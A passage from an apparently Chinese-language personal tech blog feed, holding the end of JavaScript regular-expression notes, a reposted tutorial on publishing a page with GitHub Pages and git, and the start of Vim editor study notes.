oTxt2.value=oTxt1.value.replace(re, &apos;&apos;);</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;textarea id=&quot;txt1&quot; rows=&quot;10&quot; cols=&quot;40&quot;&gt;&lt;/textarea&gt;&lt;br&gt;</span><br><span class="line">&lt;input id=&quot;btn1&quot; type=&quot;button&quot; value=&quot;转换&quot; /&gt;&lt;br&gt;</span><br><span class="line">&lt;textarea id=&quot;txt2&quot; rows=&quot;10&quot; cols=&quot;40&quot;&gt;&lt;/textarea&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3><span id="转义字符">转义字符</span></h3><ul>
<li>.（点）——任意字符</li>
<li>\d(数字)、\w(英文、数字、下划线)、\s(空白字符)      </li>
<li>\D(除了数字)、\W(除了英文、数字、下划线)、\S(除了空白字符)</li>
</ul>
<h2><span id="量词">量词</span></h2><h3><span id="什么是量词">什么是量词</span></h3><ul>
<li>{n}出现的次数</li>
<li>{n,m}，至少出现n次，最多m次</li>
<li>{n，}  最少n次，最多不限</li>
<li>例子：查找QQ号  [1-9]\d{4,10}</li>
<li>例子：固定电话    (0\d{2,3}-)?[1-9]\d{7}   ?表示前面可以有可以没有</li>
</ul>
<h3><span id="常用量词">常用量词</span></h3><ul>
<li>{n,}    至少n次</li>
<li>×        任意次    {0,}</li>
<li>？    零次或一次    {0,1}</li>
<li>＋    一次或任意次{1,}</li>
<li>{n}    正好n次</li>
</ul>
<h2><span id="常用正则例子">常用正则例子</span></h2><h3><span id="表单校验实例">表单校验实例</span></h3><ul>
<li>校验邮箱<br>   行首(^)、行尾($)</li>
<li>test 只要一部分符合要求就返回ture        </li>
</ul>
<pre><code>window.onload=function ()
{
    var oTxt=document.getElementById(&apos;txt1&apos;);
    var oBtn=document.getElementById(&apos;btn1&apos;);

    oBtn.onclick=function ()
    {
        var re=/^\w+@[a-z0-9]+\.[a-z]+$/i;

        if(re.test(oTxt.value))
        {
            alert(&apos;合法的邮箱&apos;);
        }
        else
        {
            alert(&apos;你丫写错了&apos;);
        }
    };
};


&lt;1input type=&quot;text&quot; id=&quot;txt1&quot; /&gt;
&lt;1input type=&quot;button&quot; value=&quot;校验&quot; id=&quot;btn1&quot; /&gt;
</code></pre>]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[如何在Github Pages搭建自己写的页面？]]></title>
      <url>https://uknowsec.cn/posts/skill/%E5%A6%82%E4%BD%95%E5%9C%A8Github-Pages%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84%E9%A1%B5%E9%9D%A2%EF%BC%9F.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<p>学了前端小半年，如今写了个自己的网页想要去应聘，却发现部署很麻烦，部署到阿里云之类，买域名啊啥的还要收费，说贵也不贵，但我就是傲娇~</p>
<p>google一下了解到Github有一个Github pages的功能可以搭建博客或者托管网页，而且免费耶，搜了下教程，猛地一看感觉步骤也不是很麻烦，所以就用这个了！</p>
<p>教程一大堆，却没有几个能看懂的，问题一：90%的都在讲解如何搭建博客，和我想要将自己的网页部署到上面还是有点区别的。问题二：所有的教程都用到了Git，而我只知道Git是一个开源的分布式版本控制系统。完全不知道命令行是什么鬼，只能照猫画虎的小白来说，那些教程只能帮我到桥头，但想要成功过河，还需要深夜里的一包特浓咖啡。 </p>
<p>开始教程之前的准备工作：</p>
<p>需要你自己写的网页文件。</p>
<p><a href="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305135133440-1617205021.png" target="_blank" rel="noopener"></a></p>
<p>注册Github。</p>
<p>下载安装git。<a href="https://git-scm.com/downloads" target="_blank" rel="noopener">下载地址</a></p>
<h2><span id="教程">教程</span></h2><h3><span id="步骤一">步骤一</span></h3><p>登录到Github上，新建一个repo，命名为test，勾选 initialize this repository with a README，点击create repository。</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305134947346-1921005167.png" alt=""></p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305135528627-97762586.png" alt=""></p>
<h3><span id="步骤二">步骤二</span></h3><p>打开settings，有一个Github Pages 的设置，点击Launch automatic page generator（启动自动页面生成器）</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305140204096-424861698.png" alt=""></p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305140522830-7799375.png" alt=""></p>
<h3><span id="步骤三">步骤三</span></h3><p>点击页面最后的continue to layouts，然后就可以进入设置你的页面主题，你会说这不是我的网页呀，别急嘛，先选择一个主题，点击 publish pages。</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305141007221-1678443414.png" alt=""></p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305141341080-929861094.png" alt=""></p>
<p>这个时候会出现你的网页的网址，也就是下图的 <a href="http://jiayili.github.io/test复制打开这个网址，你看到了什么？" target="_blank" rel="noopener">http://jiayili.github.io/test复制打开这个网址，你看到了什么？</a></p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305141706065-643882140.png" alt=""></p>
<p>哇塞，这不是刚自己设置选择的主题页面吗？</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305141935393-1254718979.png" alt=""></p>
<p>好了，别激动了，真正让一个小白你发疯的阶段开始了，有了自己的网址，但页面显示的是什么鬼？</p>
<p>至此以上，github上要处理的操作告一段落，该上Git了！</p>
<h3><span id="步骤四">步骤四</span></h3><p>打开此电脑，选择一个盘，比如 f 盘，右键空白处点击 git bash here。</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305143603580-1181123251.png" alt=""></p>
<h3><span id="步骤五">步骤五</span></h3><p>输入如下命令，用来在 f 盘创建 test 文件放你的github上的test repository，克隆test repository到 test 文件中。</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305144226284-240519711.png" alt=""></p>
<p>这个时候你的 f 盘，就会多一个 test 文件，打开它，</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305144422830-1748939517.png" alt=""></p>
<p>会看到一个 README.md 的文件，这个文件是从哪来的呢？追溯到gihub上，你会发现你有两个分支（branches），而 README 文件是来自 master 分支。</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305144809455-1559494911.png" alt=""></p>
<p>而我们需要编辑的是另一个分支&mdash;&mdash;gh-pages，因为这个分支才能够真正定义github pages的内容和样式，也就是可以呈现你网页的地方。</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305145219659-1397982425.png" alt=""></p>
<h3><span id="步骤六">步骤六</span></h3><p>输入以下命令，为了在本地新建一个gh-pages分支，而这个分支是远程分支origin/gh-pages的镜像，也就是我们可以在本地的gh-pages看到github上的gh-pages的内容。</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305145815252-344194499.png" alt=""></p>
<p>这个时候我们再打开 f 盘，发现变样了</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305145931096-1818738887.png" alt=""></p>
<p>刚才还是README呢，怎们现在成了3个文件了，这3个文件来自哪？</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305150144159-905298121.png" alt=""></p>
<p>来自github 上的 gh-pages 分支下的文件。</p>
<p>打开f 盘中的 index.html，你会发现就是咱们一开始选择主题的页面。那我们将这个页面替换成自己coding的网页不就好了？</p>
<h3><span id="步骤七">步骤七</span></h3><p>执行如下命令，删除原有的gh-pages文件，并提交（commit）本次修改。</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305150641830-12563151.png" alt=""></p>
<p>这个时候 f 盘没有文件。</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305151026377-702293659.png" alt=""></p>
<h3><span id="步骤八">步骤八</span></h3><p>将自己的网页文件复制粘贴至 f 盘的 test 文件中 </p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305151236221-872410232.png" alt=""></p>
<p>输入如下命令，为了本地gh-pages中的网页文件同步到远程的gh-pages中。</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305151516534-175124906.png" alt=""><br><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305151717159-2121860532.png" alt=""></p>
<p>输入最后一行 git push origin gh-pages，按回车，等一会，会有弹出框让你输入你的 github 账号和密码。</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305152031768-1166232109.png" alt=""></p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305152052471-1604781690.png" alt=""></p>
<p>ok之后耐心等待。</p>
<p>当出现像下图中的命令行之后，你已经完成了99%。</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305152406221-11660909.png" alt=""></p>
<h3><span id="最后一步">最后一步</span></h3><p>打开浏览器输入给你的网址加上 test.html，然后重重的按下回车。</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305152916580-99607842.png" alt=""></p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305153305424-1042365035.png" alt="">恭喜你，成功了！！！哦不，还差一步，不评论关注一下我？</p>
<h2><span id="附录一">附录一</span></h2><p>常用git命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ git clone&amp;nbsp;&amp;nbsp;//本地如果无远程代码，先做这步，不然就忽略 </span><br><span class="line"></span><br><span class="line">$ cd //定位到你blog的目录下 </span><br><span class="line"></span><br><span class="line">$ git status //查看本地自己修改了多少文件 </span><br><span class="line"></span><br><span class="line">$ git add . //添加远程不存在的git文件 </span><br><span class="line"></span><br><span class="line">$ git commit &amp;nbsp;-m &quot;what I want told to someone&quot; //提交修改 </span><br><span class="line"></span><br><span class="line">$ git push &amp;nbsp;//更新到远程服务器上 </span><br><span class="line"></span><br><span class="line">$ git rm //移除文件</span><br></pre></td></tr></table></figure></p>
<p>转自          <a href="http://www.cnblogs.com/lijiayi/p/githubpages.html" target="_blank" rel="noopener">如何在Github Pages搭建自己写的页面？</a></p>
]]></content>
      
        <categories>
            
            <category> 技巧 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Vim编辑器-学习笔记]]></title>
      <url>https://uknowsec.cn/posts/notes/Vim%E7%BC%96%E8%BE%91%E5%99%A8-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h1><span id="vim快速入门">vim快速入门</span></h1><h2><span id="vim模式介绍">vim模式介绍</span></h2><p>以下介绍内容来自维基百科<a href="http://zh.wikipedia.org/wiki/Vim" target="_blank" rel="noopener">Vim</a></p>
<p>从vi演生出来的Vim具有多种模式，这种独特的设计容易使初学者产生混淆。几乎所有的编辑器都会有插入和执行命令两种模式，并且大多数的编辑器使用了与Vim截然不同的方式：命令目录（鼠标或者键盘驱动），组合键（通常通过control键（CTRL）和alt键（ALT）组成）或者鼠标输入。Vim和vi一样，仅仅通过键盘来在这些模式之中切换。这就使得Vim可以不用进行菜单或者鼠标操作，并且最小化组合键的操作。对文字录入员或者程序员可以大大增强速度和效率。</p>
<p>Vim具有6种基本模式和5种派生模式，我们这里只简单介绍下6种基本模式：</p>
<ul>
<li><p>普通模式(Normal mode)</p>
<blockquote>
<p>在普通模式中，用的编辑器命令，比如移动光标，删除文本等等。这也是Vim启动后的默认模式。这正好和许多新用户期待的操作方式相反（大多数编辑器默认模式为插入模式）。</p>
<p>Vim强大的编辑能来自于其普通模式命令。普通模式命令往往需要一个操作符结尾。例如普通模式命令<code>dd</code>删除当前行，但是第一个”d”的后面可以跟另外的移动命令来代替第二个<code>d</code>，比如用移动到下一行的”j”键就可以删除当前行和下一行。另外还可以指定命令重复次数，<code>2dd</code>（重复<code>dd</code>两次），和<code>dj</code>的效果是一样的。用户学习了各种各样的文本间移动／跳转的命令和其他的普通模式的编辑命令，并且能够灵活组合使用的话，能够比那些没有模式的编辑器更加高效的进行文本编辑。</p>
<p>在普通模式中，有很多方法可以进入插入模式。比较普通的方式是按<code>a</code>（append／追加）键或者<code>i</code>（insert／插入）键。</p>
</blockquote>
</li>
<li><p>插入模式(Insert mode)</p>
<blockquote>
<p>在这个模式中，大多数按键都会向文本缓冲中插入文本。大多数新用户希望文本编辑器编辑过程中一直保持这个模式。</p>
<p>在插入模式中，可以按<code>ESC</code>键回到普通模式。</p>
</blockquote>
</li>
<li><p>可视模式(Visual mode)</p>
<blockquote>
<p>这个模式与普通模式比较相似。但是移动命令会扩大高亮的文本区域。高亮区域可以是字符、行或者是一块文本。当执行一个非移动命令时，命令会被执行到这块高亮的区域上。Vim的”文本对象”也能和移动命令一样用在这个模式中。</p>
</blockquote>
</li>
<li><p>选择模式(Select mode)</p>
<blockquote>
<p>这个模式和无模式编辑器的行为比较相似（Windows标准文本控件的方式）。这个模式中，可以用鼠标或者光标键高亮选择文本，不过输入任何字符的话，Vim会用这个字符替换选择的高亮文本块，并且自动进入插入模式。</p>
</blockquote>
</li>
<li><p>命令行模式(Command line mode)</p>
<blockquote>
<p>在命令行模式中可以输入会被解释成并执行的文本。例如执行命令（<code>:</code>键），搜索（<code>/</code>和<code>?</code>键）或者过滤命令（<code>!</code>键）。在命令执行之后，Vim返回到命令行模式之前的模式，通常是普通模式。</p>
</blockquote>
</li>
<li><p>Ex模式(Ex mode)</p>
<blockquote>
<p>这和命令行模式比较相似，在使用<code>:visual</code>命令离开Ex模式前，可以一次执行多条命令。</p>
<p>这其中我们常用到就是普通模式、插入模式和命令行模式，本课程也只涉及这三个常用模式的内容</p>
</blockquote>
</li>
</ul>
<h2><span id="三种常见模式的切换">三种常见模式的切换</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Esc 或者 Ctrl+[    #进入普通模式</span><br><span class="line">i（插入）或a(附加) #进入插入模式</span><br><span class="line">：                 #进入命令行模式</span><br><span class="line">wq                 #保存并退出vim</span><br></pre></td></tr></table></figure>
<p><img src="https://dn-anything-about-doc.qbox.me/md041716vim.gif" alt=""></p>
<h2><span id="进入vim">进入vim</span></h2><h3><span id="使用vim命令进入vim界面">使用vim命令进入vim界面</span></h3><p>vim后面加上你要打开的已存在的文件名或者不存在（则作为新建文件）的文件名。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim practice_1.txt</span><br></pre></td></tr></table></figure></p>
<p>直接使用vim<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim</span><br></pre></td></tr></table></figure></p>
<p>进入命令行模式输入<code>:e 文件路径</code>打开相应文件</p>
<h3><span id="游标移动">游标移动</span></h3><p>按<code>Esc</code>进入普通模式，在该模式下使用方向键或者<code>h</code>,<code>j</code>,<code>k</code>,<code>l</code>键可以移动游标。</p>
<table>
<thead>
<tr>
<th>按键</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>h</td>
<td style="text-align:left">左</td>
</tr>
<tr>
<td>l</td>
<td style="text-align:left">右（小写L）</td>
</tr>
<tr>
<td>j</td>
<td style="text-align:left">下</td>
</tr>
<tr>
<td>k</td>
<td style="text-align:left">上</td>
</tr>
<tr>
<td>w</td>
<td style="text-align:left">移动到下一个单词</td>
</tr>
<tr>
<td>b</td>
<td style="text-align:left">移动到上一个单词</td>
</tr>
</tbody>
</table>
<h2><span id="进入插入模式">进入插入模式</span></h2><h3><span id="进入插入模式">进入插入模式</span></h3><p><code>i</code> 进入插入模式</p>
<table>
<thead>
<tr>
<th>按键</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>i</td>
<td style="text-align:left">在当前光标处进行编辑</td>
</tr>
<tr>
<td>I</td>
<td style="text-align:left">在行首插入</td>
</tr>
<tr>
<td>A</td>
<td style="text-align:left">在行末插入</td>
</tr>
<tr>
<td>a</td>
<td style="text-align:left">在光标后插入编辑</td>
</tr>
<tr>
<td>o</td>
<td style="text-align:left">在当前行后插入一个新行</td>
</tr>
<tr>
<td>O</td>
<td style="text-align:left">在当前行前插入一个新行</td>
</tr>
<tr>
<td>cw</td>
<td style="text-align:left">替换从光标所在位置后到一个单词结尾的字符</td>
</tr>
</tbody>
</table>
<h2><span id="保存文档">保存文档</span></h2><h3><span id="命令行模式下保存文档">命令行模式下保存文档</span></h3><p><code>:</code>进入命令行模式，输入<code>w</code>回车，保存文档。输入<code>:w 文件名</code>可以将文档另存为其他文件名或存到其他路径下</p>
<h2><span id="退出vim">退出vim</span></h2><h3><span id="命令行模式下退出vim">命令行模式下退出vim</span></h3><p>从普通模式输入<code>：</code>进入命令行模式，输入`wq’回车，保存并退出编辑</p>
<p>以下为其他几种退出方法</p>
<table>
<thead>
<tr>
<th>命令</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>:q!</td>
<td style="text-align:left">强制退出，不保存</td>
</tr>
<tr>
<td>:q</td>
<td style="text-align:left">退出</td>
</tr>
<tr>
<td>:qw!</td>
<td style="text-align:left">强制保存并退出</td>
</tr>
<tr>
<td>:w &lt;文件路径&gt;</td>
<td style="text-align:left">另存为</td>
</tr>
<tr>
<td>:saveas 文件路径</td>
<td style="text-align:left">另存为</td>
</tr>
<tr>
<td>:x</td>
<td style="text-align:left">保存并退出</td>
</tr>
<tr>
<td>:wq</td>
<td style="text-align:left">保存并退出</td>
</tr>
</tbody>
</table>
<h3><span id="普通模式下退出vim">普通模式下退出vim</span></h3><p><code>Shift+zz</code>即可保存退出vim</p>
<h2><span id="删除文本">删除文本</span></h2><h3><span id="普通模式下删除vim文本信息">普通模式下删除vim文本信息</span></h3><p>进入普通模式，使用下列命令可以进行文本快速删除：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>x</td>
<td style="text-align:left">删除游标所在的字符</td>
</tr>
<tr>
<td>X</td>
<td style="text-align:left">删除游标所在前一个字符</td>
</tr>
<tr>
<td>Delete</td>
<td style="text-align:left">同x</td>
</tr>
<tr>
<td>dd</td>
<td style="text-align:left">删除整行</td>
</tr>
<tr>
<td>dw</td>
<td style="text-align:left">删除一个单词（不适用中文）</td>
</tr>
<tr>
<td>d$或D</td>
<td style="text-align:left">删除至行尾</td>
</tr>
<tr>
<td>d^</td>
<td style="text-align:left">删除至行首</td>
</tr>
<tr>
<td>dG</td>
<td style="text-align:left">删除到文档结尾处</td>
</tr>
<tr>
<td>d1G</td>
<td style="text-align:left">删至文档首部</td>
</tr>
</tbody>
</table>
<p>在命令之前加上数字，表示一次删除多行<br><code>2dd</code>表示一次删除2行</p>
<h1><span id="vim文档编辑">Vim文档编辑</span></h1><h2><span id="vim重复命令">vim重复命令</span></h2><h3><span id="重复执行上次命令">重复执行上次命令</span></h3><p>在普通模式下<code>.</code>（小数点）表示重复上次的命令操作</p>
<h3><span id="执行指定次数相同的命令">执行指定次数相同的命令</span></h3><p>普通模式输入<code>N&lt;command&gt;</code>,N表示重复后面的次数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">10x  #删除10个连续字符</span><br><span class="line">3dd  #删除3行文本</span><br><span class="line">dw   #删除一个单词</span><br><span class="line">dnw  #删除n个单词</span><br></pre></td></tr></table></figure>
<h2><span id="游标的快速跳转">游标的快速跳转</span></h2><h3><span id="行间跳转">行间跳转</span></h3><table>
<thead>
<tr>
<th>命令</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>nG(n Shift+g)</td>
<td style="text-align:left">游标移动到第 n 行(如果默认没有显示行号，请先进入命令模式，输入:set nu以显示行号)</td>
</tr>
<tr>
<td>gg</td>
<td style="text-align:left">删除游标所在前一个字符</td>
</tr>
<tr>
<td>G(Shift+g)</td>
<td style="text-align:left">到最后一行</td>
</tr>
</tbody>
</table>
<p>使用Ctrl+o快速回到上一次(跳转前)光标所在位置</p>
<h3><span id="行内跳转">行内跳转</span></h3><table>
<thead>
<tr>
<th>命令</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>w</td>
<td style="text-align:left">到下一个单词的开头</td>
</tr>
<tr>
<td>e</td>
<td style="text-align:left">到下一个单词的结尾</td>
</tr>
<tr>
<td>b</td>
<td style="text-align:left">到前一个单词的开头</td>
</tr>
<tr>
<td>ge</td>
<td style="text-align:left">到前一个单词的结尾</td>
</tr>
<tr>
<td>0或^</td>
<td style="text-align:left">到行头</td>
</tr>
<tr>
<td>$</td>
<td style="text-align:left">到行尾</td>
</tr>
<tr>
<td>f&lt;字母&gt;</td>
<td style="text-align:left">向后搜索&lt;字母&gt;并跳转到第一个匹配的位置(非常实用)</td>
</tr>
<tr>
<td>F&lt;字母&gt;</td>
<td style="text-align:left">向前搜索&lt;字母&gt;并跳转到第一个匹配的位置</td>
</tr>
<tr>
<td>t&lt;字母&gt;</td>
<td style="text-align:left">向后搜索&lt;字母&gt;并跳转到第一个匹配位置之前的一个字母(不常用)</td>
</tr>
<tr>
<td>T&lt;字母&gt;</td>
<td style="text-align:left">向前搜索&lt;字母&gt;并跳转到第一个匹配位置之后的一个字母(不常用)</td>
</tr>
</tbody>
</table>
<h2><span id="复制粘贴和剪切">复制粘贴和剪切</span></h2><h3><span id="复制及粘贴文本">复制及粘贴文本</span></h3><p>普通模式中使用<code>y</code>复制</p>
<ul>
<li>普通模式中，<code>yy</code>复制游标所在的整行（<code>3yy</code>表示复制3行）</li>
<li>普通模式中，<code>y^</code> 复制至行首，或<code>y0</code>。不含光标所在处字符。</li>
<li>普通模式中，<code>y$</code> 复制至行尾。含光所在处字符。</li>
<li>普通模式中，<code>yw</code> 复制一个单词。</li>
<li>普通模式中，<code>y2w</code> 复制两个单词。</li>
<li>普通模式中，<code>yG</code> 复制至文本末。</li>
<li>普通模式中，<code>y1G</code> 复制至文本开头。</li>
</ul>
<p>普通模式中使用<code>p</code>粘贴</p>
<ul>
<li>普通模式中，<code>p</code>(小写)代表粘贴至光标后（下）</li>
<li>普通模式中，<code>P</code>(大写)代表粘贴至光标前（上）</li>
</ul>
<h3><span id="剪切及粘贴">剪切及粘贴</span></h3><p><code>dd</code>剪切，每次<code>dd</code>后可以用<code>p</code>粘贴</p>
<h1><span id="查找替换">查找替换</span></h1><h2><span id="字符的替换及撤销undo操作">字符的替换及撤销（Undo操作）</span></h2><h3><span id="替换和撤销undo命令">替换和撤销（Undo)命令</span></h3><p>替换和Undo命令都是针对普通模式下的操作</p>
<table>
<thead>
<tr>
<th>命令</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>r+&lt;待替换字母&gt;</td>
<td style="text-align:left">将游标所在字母替换为指定字母</td>
</tr>
<tr>
<td>R</td>
<td style="text-align:left">连续替换，直到按下Esc</td>
</tr>
<tr>
<td>cc</td>
<td style="text-align:left">替换整行，即删除游标所在行，并进入插入模式</td>
</tr>
<tr>
<td>cw</td>
<td style="text-align:left">替换一个单词，即删除一个单词，并进入插入模式</td>
</tr>
<tr>
<td>C(大写)</td>
<td style="text-align:left">替换游标以后至行末</td>
</tr>
<tr>
<td>~</td>
<td style="text-align:left">反转游标所在字母大小写</td>
</tr>
<tr>
<td>u{n}</td>
<td style="text-align:left">撤销一次或n次操作</td>
</tr>
<tr>
<td>U(大写)</td>
<td style="text-align:left">撤销当前行的所有修改</td>
</tr>
<tr>
<td>Ctrl+r</td>
<td style="text-align:left">redo，即撤销undo的操作</td>
</tr>
</tbody>
</table>
<h2><span id="快速缩进">快速缩进</span></h2><h3><span id="使用命令进行快速调整缩进操作">使用命令进行快速调整缩进操作</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;    #整行将向缩进</span><br><span class="line">&lt;&lt;    #整行向左回退</span><br></pre></td></tr></table></figure>
<h3><span id="shiftwidth命令">shiftwidth命令</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:set shiftwidth?     #获取目前的缩进字符值</span><br><span class="line">:set shiftwidth=10   #设置缩进字符值为10</span><br></pre></td></tr></table></figure>
<h3><span id="调整文本位置">调整文本位置</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">:re		#居中   </span><br><span class="line">:ri		#靠右</span><br><span class="line">:le		#靠左</span><br></pre></td></tr></table></figure>
<h2><span id="查找">查找</span></h2><h3><span id="快速查找">快速查找</span></h3><p>普通模式下输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/www		#向下查找www</span><br><span class="line">?www 		#向上查找www</span><br><span class="line">n   		#进入查找后，n正向查找</span><br><span class="line">N   		#进入查找后，N反向查找</span><br></pre></td></tr></table></figure>
<h3><span id="高级查找">高级查找</span></h3><ul>
<li>普通模式下输入<code>\*</code>寻找游标所在处的单词</li>
<li>普通模式下输入<code>\#</code>同上，但 <code>\*</code> 是向前（上）找，#则是向后（下）找</li>
<li>普通模式下输入<code>g\*</code>同<code>\*</code> ，但部分符合该单词即可</li>
<li>普通模式下输入<code>g\#</code>同<code>\#</code> ，但部分符合该单词即可</li>
</ul>
<h1><span id="高级功能入门">高级功能入门</span></h1><h2><span id="多文件编辑">多文件编辑</span></h2><h3><span id="使用vim编辑多个文件">使用vim编辑多个文件</span></h3><p>同时创建两个新文件并编辑<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim 1.txt 2.txt</span><br></pre></td></tr></table></figure></p>
<p>默认进入1.txt文件的编辑界面</p>
<ul>
<li>命令行模式下输入:n编辑2.txt文件，可以加!即:n!强制切换，之前一个文件的输入没有保存，仅仅切换到另一个文件</li>
<li>命令行模式下输入:N编辑1.txt文件，可以加!即:N!强制切换，之前文件内的输入没有保存，仅仅是切换到另一个文件</li>
</ul>
<h3><span id="进入vim后打开新文件">进入vim后打开新文件</span></h3><ul>
<li>命令行模式下输入<code>:e 3.txt</code> 打开新文件3.txt</li>
<li>命令行模式下输入<code>:e#</code> 回到前一个文件</li>
<li>命令行模式下输入<code>:ls</code>可以列出以前编辑过的文档</li>
<li>命令行模式下输入<code>:b 2.txt</code>（或者编号）可以直接进入文件2.txt编辑</li>
<li>命令行模式下输入<code>:bd 2.txt</code>（或者编号）可以删除以前编辑过的列表中的文件项目</li>
<li>命令行模式下输入<code>:e! 4.txt</code>，新打开文件4.txt，放弃正在编辑的文件</li>
<li>命令行模式下输入<code>:f</code> 显示正在编辑的文件名</li>
<li>命令行模式下输入<code>:f new.txt</code>，改变正在编辑的文件名字为new.txt</li>
</ul>
<h3><span id="恢复文件">恢复文件</span></h3><p>如果因为断电等原因造成文档没有保存，可以采用恢复方式，<code>vim -r</code>进入文档后，输入<code>:ewcover 1.txt</code>来恢复<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim -r 1.txt</span><br></pre></td></tr></table></figure></p>
<h2><span id="可视模式">可视模式</span></h2><h3><span id="可视模式命令简介">可视模式命令简介</span></h3><ul>
<li>在普通模式下输入<code>v</code>（小写），进入字符选择模式，就可以移动光标，光标走过的地方就会选取。再次按下v会后就会取消选取。</li>
<li>在普通模式下输入<code>Shift+v</code>（小写），进入行选择模式，按下V之后就会把整行选取，您可以上下移动光标选更多的行，同样，再按一次<code>Shift+v</code>就可以取消选取。</li>
<li>在普通模式下输入 <code>Ctrl+v</code>（小写），这是区域选择模式，可以进行矩形区域选择，再按一次<code>Ctrl+v</code>取消选取。</li>
<li>在普通模式下输入<code>d</code>删除选取区域内容</li>
<li>在普通模式下输入<code>y</code>复制选取区域内容</li>
</ul>
<h2><span id="视窗操作">视窗操作</span></h2><h3><span id="视窗操作简介">视窗操作简介</span></h3><p>vim可以在一个界面里打开多个窗口进行编辑，这些编辑窗口称为vim的视窗。<br>打开方法有很多种，例如可以使用在命令行模式下输入<code>:new</code> 打开一个新的vim视窗，并进入视窗编辑一个新文件（普通模式下输入<code>Ctrl+w</code>也可以,但是<code>Ctrl+w</code>在chrome下会与chrome关闭标签页的快捷键冲突，所以使用该快捷键你可以在IE或其它浏览器进行练习），除了<code>:new</code>命令，下述列举的多种方法也可以在命令模式或普通模式下打开新的视窗：</p>
<ul>
<li>命令行模式下输入<code>:sp 1.txt</code> 打开新的横向视窗来编辑1.txt</li>
<li>命令行模式下输入<code>:vsp 2.txt</code> 打开新的纵向视窗来编辑1.txt</li>
<li>普通模式下<code>Ctrl-w s</code> 将当前窗口分割成两个水平的窗口</li>
<li>普通模式下<code>Ctrl-w v</code> 将当前窗口分割成两个垂直的窗口</li>
